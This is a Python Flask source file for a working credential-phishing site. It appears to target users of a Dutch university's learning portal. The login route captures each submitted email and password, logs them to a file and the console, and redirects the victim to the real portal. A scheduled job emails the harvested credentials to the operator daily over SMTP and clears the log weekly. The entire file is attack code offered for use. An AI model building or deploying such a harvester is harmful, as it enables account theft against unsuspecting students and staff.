from flask import Flask, render_template, request, redirect
from apscheduler.schedulers.background import BackgroundScheduler
from email.message import EmailMessage
import smtplib
import datetime
import os


os.system('color')

app = Flask(__name__)
app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'


def clear_data():
    with open('data.txt', 'w') as f:
        f.write()


def send_login():
    with open('data.txt', 'r') as f:
        lines = f.readlines()  
        
    body_string = ''.join(lines)


    email = EmailMessage()
    email['Subject'] = f'information {datetime.datetime.now()}'
    email['From'] = 'FROM_EMAIL'
    email['To'] = 'TO_EMAIL'
    email.set_content(body_string)

    with smtplib.SMTP("smtp.office365.com", 587) as s:
        s.starttls()
        s.login('FROM_EMAIL', 'FROM_EMAIL_PASSWORD')
        s.send_message(email)
        
    print('\nmail send!\n')
    
    
sched = BackgroundScheduler(daemon=True)
sched.add_job(send_login, 'interval', minutes=1440)
sched.add_job(clear_data, 'interval', minutes=10080)
sched.start()


@app.route('/', methods = ['POST', 'GET'])
def home():
    if request.method == 'POST':
        email = request.form['Email']
        password = request.form['Password']
        
        print(f'\033[2;31;43m {email} \033[0;0m put his password in: \033[2;31;43m{password} \033[0;0m')
        
        with open('data.txt', 'a') as f:
            f.write(f'{email} : {password}\n')
            
        return redirect("https://dlo.mijnhva.nl/d2l/home")
    
    else:
        return render_template('home.html')


if __name__ == '__main__':
    app.run()